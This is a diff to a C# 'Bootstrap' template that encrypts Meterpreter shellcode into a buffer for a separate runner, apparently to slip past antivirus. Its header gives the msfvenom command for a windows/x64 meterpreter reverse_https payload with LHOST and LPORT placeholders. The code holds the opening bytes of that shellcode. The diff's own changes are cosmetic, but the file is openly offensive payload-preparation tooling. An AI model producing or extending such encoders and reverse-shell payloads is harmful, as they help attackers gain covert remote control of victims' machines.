@@ -1,9 +1,9 @@
 // =============================================================================
-// TEMPLATE — replace shellcode bytes with your msfvenom output before compiling
+// TEMPLATE - replace shellcode bytes with your msfvenom output before compiling
 //
 //   1. msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f csharp
 //   2. Paste the bytes into the shellcode array below and update the byte count
-//   3. Compile and run — output is your encrypted buf, ready to paste into a runner
+//   3. Compile and run - output is your encrypted buf, ready to paste into a runner
 // =============================================================================
 
 using System;
@@ -20,7 +20,7 @@ namespace Bootstrap
     {
         public static void Main(string[] args)
         {
-            // Your provided shellcode (12 bytes; note: you declared it as 783, but only 12 values are listed—adjust if this is incomplete)
+            // Your provided shellcode (12 bytes; note: you declared it as 783, but only 12 values are listed-adjust if this is incomplete)
             byte[] shellcode = new byte[12] {
                 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8,
                 0xcc, 0x00, 0x00, 0x00, 0x48, 0x0f
@@ -35,12 +35,12 @@ namespace Bootstrap
         {
             var sb = new StringBuilder();
 
-            sb.AppendLine($"byte[] {varName} = new byte[{bytes.Length}] {{");
+            sb.AppendLine("byte[] " + varName + " = new byte[" + bytes.Length + "] {");
             sb.Append("    ");
 
             for (int i = 0; i < bytes.Length; i++)
             {
-                sb.Append($"0x{bytes[i]:x2}");
+                sb.Append("0x" + bytes[i].ToString("x2"));
 
                 // Add comma except on the very last byte
                 if (i < bytes.Length - 1)
